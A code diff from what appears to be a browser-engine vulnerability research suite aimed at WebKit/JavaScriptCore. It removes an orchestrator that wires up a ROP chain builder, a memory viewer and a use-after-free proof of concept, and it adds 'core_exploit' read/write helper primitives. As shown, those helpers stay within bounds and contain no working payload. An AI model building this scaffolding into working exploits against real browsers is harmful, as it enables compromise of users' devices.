@@ -1,161 +1,177 @@
-// js/main.mjs
-import { 
-    getRunBtnS1, getRunBtnCanvasS2, getRunBtnAdvancedS3, 
-    getBuildRopChainBtn, getViewMemoryBtn, cacheCommonElements,
-    getInteractiveCanvasS2 // Necessário para o cleanup do S2
-} from './dom_elements.mjs';
 
-// Importar os runners de cada script
-import { runAllTestsS1 } from './script1/runAllTestsS1.mjs';
-import { runCanvasTest } from './script2/runCanvasTestSequence.mjs'; 
-import { runAllAdvancedTestsS3 } from './script3/runAllAdvancedTestsS3.mjs';
+// js/core_exploit.mjs
+import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs'; // Usando utils.mjs para AdvancedInt64
+import { logS3 as log } from './script3/s3_utils.mjs'; // Logger padrão para este módulo
+import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs'; // CORRIGIDO: Assumindo config.mjs está na mesma pasta js/
 
-// Importar handlers para ferramentas interativas do Script 3
-import { buildRopChainFromUI } from './script3/rop_builder.mjs';
-import { viewMemoryFromUI } from './script3/memory_viewer.mjs';
+export let oob_array_buffer_real = null;
+export let oob_dataview_real = null;
 
-// Para o cleanup do S2
-import { getCanvasClickListenerS2, getCanvasMoveListenerS2, getGpuDeviceS2, clearS2State } from './state.mjs';
+const toHexHelper = (val, bits = 32) => toHex(val, bits);
 
-// --- NOVA IMPORTAÇÃO PARA O TESTE DE UAF ---
-import { triggerUAF } from './uaf_webkit_poc/poc.js'; 
-// ^^^ Assume que poc.js estará em js/uaf_webkit_poc/poc.js
-
-function initialize() {
-    console.log("Initializing Vulnerability Suite (Modular - Full Orchestration)...");
-    cacheCommonElements();
-
-    // Botão Script 1
-    const btnS1 = getRunBtnS1();
-    if (btnS1) {
-        btnS1.addEventListener('click', async () => {
-            console.log("Botão S1 (runAllTestsS1) Clicado");
-            try {
-                await runAllTestsS1();
-            } catch (e) {
-                console.error("Erro ao executar testes do Script 1:", e);
-                alert(`Erro Script 1: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'runBtnS1' não encontrado."); }
-
-    // Botão Script 2 (Canvas)
-    const btnS2 = getRunBtnCanvasS2();
-    if (btnS2) {
-        btnS2.addEventListener('click', async () => {
-            console.log("Botão S2 (runCanvasTest) Clicado");
-            try {
-                await runCanvasTest();
-            } catch (e) {
-                console.error("Erro ao executar testes do Script 2 (Canvas):", e);
-                alert(`Erro Script 2: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'runCanvasBtnS2' não encontrado."); }
-
-    // Botão Script 3 (Testes Avançados Automatizados)
-    const btnS3 = getRunBtnAdvancedS3();
-    if (btnS3) {
-        btnS3.addEventListener('click', async () => {
-            console.log("Botão S3 (runAllAdvancedTestsS3) Clicado");
-            try {
-                await runAllAdvancedTestsS3();
-            } catch (e) {
-                console.error("Erro ao executar testes avançados do Script 3:", e);
-                alert(`Erro Script 3: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'runAdvancedBtnS3' não encontrado."); }
-    
-    // Botão Construtor ROP (Script 3 Interativo)
-    const btnRop = getBuildRopChainBtn();
-    if (btnRop) {
-        btnRop.addEventListener('click', () => {
-            console.log("Botão Construir Cadeia ROP Clicado");
-            try {
-                if (typeof buildRopChainFromUI === 'function') {
-                    buildRopChainFromUI();
-                } else {
-                    console.error("Função buildRopChainFromUI não carregada/importada corretamente.");
-                    alert("Erro: Função ROP Builder não disponível.");
-                }
-            } catch (e) {
-                console.error("Erro ao chamar buildRopChainFromUI:", e);
-                alert(`Erro ROP Builder: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'buildRopChainBtn' não encontrado."); }
-
-    // Botão Visualizador de Memória (Script 3 Interativo)
-    const btnMemView = getViewMemoryBtn();
-    if (btnMemView) {
-        btnMemView.addEventListener('click', () => {
-            console.log("Botão Visualizar Memória Clicado");
-            try {
-                if (typeof viewMemoryFromUI === 'function') {
-                    viewMemoryFromUI();
-                } else {
-                    console.error("Função viewMemoryFromUI não carregada/importada corretamente.");
-                    alert("Erro: Função Memory Viewer não disponível.");
-                }
-            } catch (e) {
-                console.error("Erro ao chamar viewMemoryFromUI:", e);
-                alert(`Erro Memory Viewer: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'viewMemoryBtn' não encontrado."); }
-
-    // --- NOVO BOTÃO E EVENT LISTENER PARA O TESTE DE UAF ---
-    const btnUAF = document.getElementById('runUAFBtn');
-    if (btnUAF) {
-        btnUAF.addEventListener('click', () => {
-            console.log("Botão Teste UAF WebKit Clicado");
-            try {
-                // Os elementos .container e .child são pegos diretamente pelo poc.js do DOM global
-                triggerUAF(); 
-                // O poc.js usa seu próprio debug_log, que anexa <p> ao final do body.
-            } catch (e) {
-                console.error("Erro ao executar Teste UAF WebKit:", e);
-                alert(`Erro Teste UAF WebKit: ${e.message}`);
-            }
-        });
-    } else { console.warn("Botão 'runUAFBtn' não encontrado."); }
-    // --- FIM DO NOVO BOTÃO ---
-    
-    window.addEventListener('unload', () => {
-        console.log("[main.mjs] Tentando limpeza no evento 'unload'...");
-        try {
-            const canvasElementS2 = getInteractiveCanvasS2();
-            const clickListener = getCanvasClickListenerS2();
-            const moveListener = getCanvasMoveListenerS2();  
-
-            if (clickListener && canvasElementS2) {
-                canvasElementS2.removeEventListener('click', clickListener);
-                console.log("Listener de clique do Canvas S2 removido.");
-            }
-            if (moveListener && canvasElementS2) {
-                canvasElementS2.removeEventListener('mousemove', moveListener);
-                console.log("Listener de movimento do mouse do Canvas S2 removido.");
-            }
-            
-            const gpuDev = getGpuDeviceS2(); 
-            if (gpuDev && typeof gpuDev.destroy === 'function') {
-                // gpuDev.destroy(); 
-            }
-            clearS2State(); 
-            console.log("Estado do S2 limpo.");
-
-        } catch (e) {
-            console.warn("[main.mjs] Erro durante a limpeza no 'unload':", e);
-        }
-        console.log("[main.mjs] Limpeza no 'unload' tentada.");
-    });
-
-    console.log("Vulnerability Suite (Modular - Full Orchestration) Inicializada.");
+export function clearOOBEnvironment() {
+    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment';
+    log(`Limpando ambiente OOB...`, 'info', FNAME_CLEAR);
+    oob_array_buffer_real = null;
+    oob_dataview_real = null;
+    log(`Ambiente OOB limpo.`, 'good', FNAME_CLEAR);
 }
 
-if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', initialize);
-} else {
-    initialize(); 
+export function getOOBAllocationSize() { 
+    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
+        updateOOBConfigFromUI(document); 
+    }
+    return OOB_CONFIG.ALLOCATION_SIZE; 
+}
+export function getBaseOffsetInDV() { 
+    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
+        updateOOBConfigFromUI(document); 
+    }
+    return OOB_CONFIG.BASE_OFFSET_IN_DV; 
+}
+export function getInitialBufferSize() { 
+    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
+        updateOOBConfigFromUI(document); 
+    }
+    return OOB_CONFIG.INITIAL_BUFFER_SIZE; 
+}
+
+export async function triggerOOB_primitive() {
+    const FNAME = 'CoreExploit.triggerOOB_primitive';
+    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
+        updateOOBConfigFromUI(document);
+    }
+    log(`--- Iniciando ${FNAME} ---`, 'test', FNAME);
+    log(`   Config OOB: AllocSize=${OOB_CONFIG.ALLOCATION_SIZE}, BaseOffsetDV=${OOB_CONFIG.BASE_OFFSET_IN_DV}, InitialBufSize=${OOB_CONFIG.INITIAL_BUFFER_SIZE}`, 'info', FNAME);
+    clearOOBEnvironment();
+    try {
+        if (OOB_CONFIG.ALLOCATION_SIZE <= 0) throw new Error(`Tamanho de Alocação OOB inválido: ${OOB_CONFIG.ALLOCATION_SIZE}.`);
+        
+        const totalSizeForArrayBuffer = OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE + 128; 
+        if (totalSizeForArrayBuffer <=0 ) throw new Error(`Cálculo de tamanho total inválido: ${totalSizeForArrayBuffer}.`);
+        
+        oob_array_buffer_real = new ArrayBuffer(totalSizeForArrayBuffer);
+        
+        if (OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE > totalSizeForArrayBuffer) {
+            throw new Error(`DataView excede ArrayBuffer: offset+length=${OOB_CONFIG.BASE_OFFSET_IN_DV + OOB_CONFIG.ALLOCATION_SIZE}, total=${totalSizeForArrayBuffer}`);
+        }
+        oob_dataview_real = new DataView(oob_array_buffer_real, OOB_CONFIG.BASE_OFFSET_IN_DV, OOB_CONFIG.ALLOCATION_SIZE);
+        
+        log(`Ambiente para Operações OOB CONFIGURADO.`, 'vuln', FNAME);
+        log(`   oob_array_buffer_real (total): ${oob_array_buffer_real.byteLength} bytes`, 'info', FNAME);
+        log(`   oob_dataview_real (janela controlada): offset=${oob_dataview_real.byteOffset}, length=${oob_dataview_real.byteLength} bytes`, 'info', FNAME);
+    } catch (e) {
+        log(`ERRO CRÍTICO ao tentar configurar ambiente OOB: ${e.name} - ${e.message}`, "error", FNAME);
+        console.error("Erro detalhado em triggerOOB_primitive:", e);
+        oob_array_buffer_real = null; oob_dataview_real = null;
+    }
+    log(`--- ${FNAME} Concluído ---`, 'test', FNAME);
+}
+
+// Offsets são relativos ao início do oob_array_buffer_real
+export function oob_read_absolute(absolute_offset, byteLength = 4) {
+    if (!oob_array_buffer_real) {
+        log("ERRO: oob_array_buffer_real não ativo para leitura.", "error", "CoreExploit.ReadAbs");
+        throw new Error("OOB Read Abs: Ambiente não ativo.");
+    }
+    if (absolute_offset < 0 || absolute_offset + byteLength > oob_array_buffer_real.byteLength) {
+        log(`ERRO Leitura OOB Abs: Offset ${toHexHelper(absolute_offset)} FORA dos limites (${oob_array_buffer_real.byteLength}b).`, "error", "CoreExploit.ReadAbs");
+        throw new RangeError(`OOB Read Abs: Fora dos limites. Offset: ${absolute_offset}, Len: ${byteLength}, BufSize: ${oob_array_buffer_real.byteLength}`);
+    }
+    const tempView = new DataView(oob_array_buffer_real);
+    try {
+        if (byteLength === 1) return tempView.getUint8(absolute_offset);
+        if (byteLength === 2) return tempView.getUint16(absolute_offset, true);
+        if (byteLength === 4) return tempView.getUint32(absolute_offset, true);
+        if (byteLength === 8) {
+            const low = tempView.getUint32(absolute_offset, true);
+            const high = tempView.getUint32(absolute_offset + 4, true);
+            const int64Instance = new AdvancedInt64(low, high);
+            // Log de debug que estava no seu core_exploit.mjs original, adaptado:
+            if (log && typeof log === 'function') { // Verifica se log está disponível
+                 log(`DEBUG_CORE_READ8: Criado AdvancedInt64: low=${toHexHelper(low)}, high=${toHexHelper(high)}. isAdvInt64=${isAdvancedInt64Object(int64Instance)}, val=${int64Instance.toString(true)}`, 'info', 'CoreExploit.ReadAbs');
+            }
+            return int64Instance;
+        }
+        throw new Error("Tamanho de leitura OOB (abs) inválido: " + byteLength);
+    } catch (e) {
+        log(`Exceção durante oob_read_absolute em offset ${toHexHelper(absolute_offset)}: ${e.name} - ${e.message}`, "error", "CoreExploit.ReadAbs");
+        throw e;
+    }
+}
+
+export function oob_write_absolute(absolute_offset, value, byteLength = 4) {
+    if (!oob_array_buffer_real) {
+        log("ERRO: oob_array_buffer_real não ativo para escrita.", "error", "CoreExploit.WriteAbs");
+        throw new Error("OOB Write Abs: Ambiente não ativo.");
+    }
+    if (absolute_offset < 0 || absolute_offset + byteLength > oob_array_buffer_real.byteLength) {
+        log(`ERRO Escrita OOB Abs: Offset ${toHexHelper(absolute_offset)} FORA dos limites (${oob_array_buffer_real.byteLength}b).`, "error", "CoreExploit.WriteAbs");
+        throw new RangeError(`OOB Write Abs: Fora dos limites. Offset: ${absolute_offset}, Len: ${byteLength}, BufSize: ${oob_array_buffer_real.byteLength}`);
+    }
+    const tempView = new DataView(oob_array_buffer_real);
+    try {
+        if (byteLength === 1) { tempView.setUint8(absolute_offset, Number(value)); return; }
+        if (byteLength === 2) { tempView.setUint16(absolute_offset, Number(value), true); return; }
+        if (byteLength === 4) { tempView.setUint32(absolute_offset, Number(value), true); return; }
+        if (byteLength === 8) {
+            let valToSet = value;
+            if (typeof value === 'number') { // Se for um número JS, converte para AdvancedInt64
+                valToSet = AdvancedInt64.fromNumber(value);
+            }
+            if (!isAdvancedInt64Object(valToSet)) {
+                throw new TypeError("Para escrita OOB 8-byte, o valor deve ser um AdvancedInt64 ou um número JS convertível.");
+            }
+            tempView.setUint32(absolute_offset, valToSet.low(), true);
+            tempView.setUint32(absolute_offset + 4, valToSet.high(), true);
+            return;
+        }
+        throw new Error("Tamanho/valor de escrita OOB (abs) inválido: " + byteLength + ", valor: " + String(value));
+    } catch (e) {
+        log(`Exceção durante oob_write_absolute em offset ${toHexHelper(absolute_offset)}: ${e.name} - ${e.message}`, "error", "CoreExploit.WriteAbs");
+        throw e;
+    }
+}
+
+export async function testCoreExploitModule(logFnParam) {
+    const FNAME_TEST = "CoreExploit.testModule";
+    const currentLog = logFnParam || log; 
+    
+    currentLog(`--- Testando Módulo CoreExploit (core_exploit.mjs) ---`, "test", FNAME_TEST);
+    await triggerOOB_primitive(); 
+    if (!oob_array_buffer_real) {
+        currentLog("Falha ao configurar ambiente OOB. Teste do módulo abortado.", "error", FNAME_TEST);
+        return;
+    }
+    
+    const safe_abs_offset = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + Math.floor((OOB_CONFIG.ALLOCATION_SIZE || 0) / 2);
+    const test_val32 = 0x12345678;
+    const test_val64 = new AdvancedInt64("0xAABBCCDDEEFF0011");
+
+    try {
+        currentLog(`Escrevendo ${toHexHelper(test_val32)} em offset absoluto ${toHexHelper(safe_abs_offset)}`, "info", FNAME_TEST);
+        oob_write_absolute(safe_abs_offset, test_val32, 4);
+        const read_val32 = oob_read_absolute(safe_abs_offset, 4);
+        if (read_val32 === test_val32) {
+            currentLog(`SUCESSO: Lido ${toHexHelper(read_val32)} corretamente (32bit).`, "good", FNAME_TEST);
+        } else {
+            currentLog(`FALHA: Lido ${toHexHelper(read_val32)}, esperado ${toHexHelper(test_val32)}.`, "error", FNAME_TEST);
+        }
+
+        const next_abs_offset = safe_abs_offset + 4;
+        currentLog(`Escrevendo ${test_val64.toString(true)} em offset absoluto ${toHexHelper(next_abs_offset)}`, "info", FNAME_TEST);
+        oob_write_absolute(next_abs_offset, test_val64, 8);
+        const read_val64 = oob_read_absolute(next_abs_offset, 8);
+        
+        if (isAdvancedInt64Object(read_val64) && read_val64.equals(test_val64)) {
+            currentLog(`SUCESSO: Lido ${read_val64.toString(true)} corretamente (64bit).`, "good", FNAME_TEST);
+        } else {
+            const readValStr = isAdvancedInt64Object(read_val64) ? read_val64.toString(true) : String(read_val64);
+            currentLog(`FALHA: Lido ${readValStr}, esperado ${test_val64.toString(true)}.`, "error", FNAME_TEST);
+        }
+    } catch (e) {
+        currentLog(`ERRO durante o teste do módulo CoreExploit: ${e.name} - ${e.message}`, "error", FNAME_TEST);
+        console.error("Erro em CoreExploit.testModule:", e);
+    }
+    currentLog(`--- Teste CoreExploit Concluído ---`, "test", FNAME_TEST);
 }
